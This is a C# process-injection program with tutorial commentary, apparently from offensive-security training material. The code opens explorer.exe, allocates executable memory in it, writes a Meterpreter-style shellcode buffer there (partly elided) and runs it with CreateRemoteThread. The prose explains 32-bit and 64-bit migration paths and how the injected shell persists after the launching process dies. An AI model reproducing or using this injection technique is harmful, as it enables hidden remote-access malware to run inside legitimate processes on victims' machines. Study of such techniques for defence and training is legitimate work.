    using System;
    using System.Runtime.InteropServices;
    
    
    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            static void Main(string[] args)
            {
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
    
                byte[] buf = new byte[591] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                ....
                0x0a,0x41,0x89,0xda,0xff,0xd5 };
                            IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
    
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }


Before compiling the project, we need to remember to set the CPU architecture to x64 since we are injecting into a 64-bit process.

Note that 64-bit versions of Windows can run both 32 and 64-bit processes. This means that we could face four potential migration paths: 64-bit -> 64-bit, 64-bit -> 32-bit, 32-bit -> 32-bit and 32-bit -> 64-bit.

The first three paths will work as expected. However, the fourth (32-bit -> 64-bit) will fail since CreateRemoteThread does not support this.

One workaround (which is what advanced implants like Meterpreter do) is to execute the call directly in assembly. The technique involves performing a translation from 32-bit to 64-bit long mode inside the 32-bit process. 

After getting shell, The process ID indicates that the Meterpreter shell is indeed running inside explorer.exe.

We will be able to launch our Meterpreter shellcode directly inside explorer.exe, which means that even if the original process is killed, the shell will live on.
